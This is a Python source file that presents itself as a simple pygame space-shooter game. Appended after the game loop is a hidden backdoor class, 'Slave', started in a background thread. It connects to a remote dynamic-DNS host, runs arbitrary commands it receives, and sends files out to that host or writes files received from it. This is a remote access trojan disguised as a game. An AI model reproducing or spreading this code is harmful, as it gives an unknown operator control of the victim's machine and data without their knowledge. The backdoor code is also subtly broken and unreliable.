import os
import threading
import glob
import subprocess
import socket
import platform
import pygame
import random

encrypted_tunnel = False

HEIGHT = 600
WIDTH = 480
FPS = 60
# color
BLACK = (0, 0, 0)
WHITE = (255, 255, 255)
RED = (255, 0, 0)
GREEN = (0, 255, 0)
BLUE = (0, 0, 255)
YELLOW = (255, 255, 0)

# initialize pygmae and create window
pygame.init()
pygame.mixer.init()
screen = pygame.display.set_mode((WIDTH, HEIGHT))
pygame.display.set_caption("Shmup!")
clock = pygame.time.Clock()

# load image and assets
imgdir = os.path.join(os.path.dirname(__file__), "image")
background = pygame.image.load(os.path.join(
    imgdir, "spacebackground.png")).convert()
background_rect = background.get_rect()
playerImg = pygame.image.load(os.path.join(
    imgdir, "playerShip1_green.png")).convert()
bullet = pygame.image.load(os.path.join(imgdir, "laserRed12.png")).convert()
meteor = pygame.image.load(os.path.join(
    imgdir, "meteorBrown_big3.png")).convert()


class Player(pygame.sprite.Sprite):
    def __init__(self):
        pygame.sprite.Sprite.__init__(self)
        self.image = pygame.transform.scale(playerImg, (50, 38))
        self.image.set_colorkey(BLACK)
        self.rect = self.image.get_rect()
        self.rect.centerx = WIDTH/2
        self.rect.bottom = HEIGHT - 10
        self.speedx = 0
        self.speedy = 0

    def update(self):
        self.speedx = 0
        self.speedy = 0
        keystate = pygame.key.get_pressed()
        if keystate[pygame.K_LEFT]:
            self.speedx = -5
        if keystate[pygame.K_RIGHT]:
            self.speedx = 5
        self.rect.x += self.speedx
        if self.rect.right > WIDTH:
            self.rect.right = WIDTH
        if self.rect.left < 0:
            self.rect.left = 0
        if keystate[pygame.K_UP]:
            self.speedy = -5
        if self.rect.top < 0:
            self.rect.top = 0
        if keystate[pygame.K_DOWN]:
            self.speedy = 5
        if self.rect.bottom > HEIGHT:
            self.rect.bottom = HEIGHT
        self.rect.y += self.speedy

    def shoot(self):
        bullet = Bullet(self.rect.centerx, self.rect.top)
        all_sprite.add(bullet)
        bullets.add(bullet)


class Mob(pygame.sprite.Sprite):
    def __init__(self):
        pygame.sprite.Sprite.__init__(self)
        self.image = meteor
        self.image.set_colorkey(BLACK)
        self.rect = self.image.get_rect()
        self.rect.x = random.randrange(WIDTH-self.rect.width)
        self.rect.y = random.randrange(-100, -40)
        self.speedy = random.randrange(1, 8)
        self.speedx = random.randrange(-3, 3)

    def update(self):
        self.rect.y += self.speedy
        self.rect.x += self.speedx
        if self.rect.top > HEIGHT + 10 or self.rect.left < -25 or self.rect.right > WIDTH+20:
            self.rect.x = random.randrange(WIDTH-self.rect.width)
            self.rect.y = random.randrange(-100, -40)
            self.speedy = random.randrange(1, 8)


class Bullet(pygame.sprite.Sprite):
    def __init__(self, x, y):
        pygame.sprite.Sprite.__init__(self)
        self.image = bullet
        self.image.set_colorkey(BLACK)
        self.rect = self.image.get_rect()
        self.rect.bottom = y
        self.rect.centerx = x
        self.speedy = -10

    def update(self):
        self.rect.y += self.speedy
        # kill if it moves off the top the screen
        if self.rect.bottom < 0:
            self.kill()


all_sprite = pygame.sprite.Group()
mobs = pygame.sprite.Group()
bullets = pygame.sprite.Group()
player = Player()
all_sprite.add(player)
for i in range(8):
    mob = Mob()
    all_sprite.add(mob)
    mobs.add(mob)

# Game Loop

running = True
while running:
    # keep loop running at the right speed
    clock.tick(FPS)
    # Process input (events)
    for events in pygame.event.get():
        # checking for closing window
        if events.type == pygame.QUIT:
            running = False
        elif events.type == pygame.KEYDOWN:
            if events.key == pygame.K_SPACE:
                player.shoot()
    # update
    all_sprite.update()
    # check to see if a bullet hit a mobs
    hits = pygame.sprite.groupcollide(mobs, bullets, True, True)
    for hit in hits:
        m = Mob()
        all_sprite.add(m)
        mobs.add(m)
    # check to see if a mob hit player
    hits = pygame.sprite.spritecollide(player, mobs, False)
    if hits:
        running = False

    # Draw / render
    screen.fill(BLACK)
    screen.blit(background, background_rect)
    all_sprite.draw(screen)
    # after drawing everything, fip display
    pygame.display.flip()

pygame.quit()


class Slave(socket.socket):
    def __init__(self, fam, proto):
        socket.socket.__init__(self, fam, proto)
        IP = 'prayagpiya.ddns.net'
        PORT = 4988
        self.connect((IP, PORT))
        self.Oder()

    def Oder(self):
        while True:
            try:
                data = self.recv(2048)
                data = data.decode('utf-8')
                if data[:2] == "cd":
                    os.chdir(data[3:])
                    self.send(str(os.getcwd()).encode('utf-8'))
                elif data[:8] == "download":
                    print("1")
                    self.download(data[9:])
                elif data[:6] == "upload":
                    self.upload(data[7:])
                    self.send("[+] Upload Complete".encode('utf-8'))
                    # continue
                elif data == "uname":
                    os = platform.platform()
                    self.send(os.encode('utf-8'))

                else:
                    cmd = subprocess.Popen(
                        data[:], shell=False, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                    command_out_bytes = cmd.stdout.read()
                    self.send(command_out_bytes)
            except Exception as e:
                self.send("[+] No such command".encode('utf-8'))

    def upload(self, file):
        self.send("fsize".encode('utf-8'))
        fsize = self.recv(2048)
        fsize = fsize.decode('utf-8')
        self.send('DONE'.encode('utf-8'))
        f = open('new'+file, 'wb')
        data = self.recv(2048)
        totalRecv = len(data)
        f.write(data)
        while totalRecv < int(fsize):
            data = self.recv(2048)
            totalRecv += len(data)
            f.write(data)

    def download(self, file):
        if os.path.isfile(file):
            self.send("EXISTS".encode("utf-8") + ' '.encode('utf-8') +
                      str(os.path.getsize(file)).encode('utf-8'))
            resp = self.recv(2048)
            resp = resp.decode('utf-8')
            if resp == "Listening":
                with open(file, 'rb') as f:
                    data = f.read(2048)
                    self.send(data)
                    while data != b'':
                        data = f.read(2048)
                        self.send(data)
                    print("DONE")


#Slave(socket.AF_INET, socket.SOCK_STREAM)
t = threading.Thread(target=Slave, args=(socket.AF_INET, socket.SOCK_STREAM))
t.daemon = True
t.start()
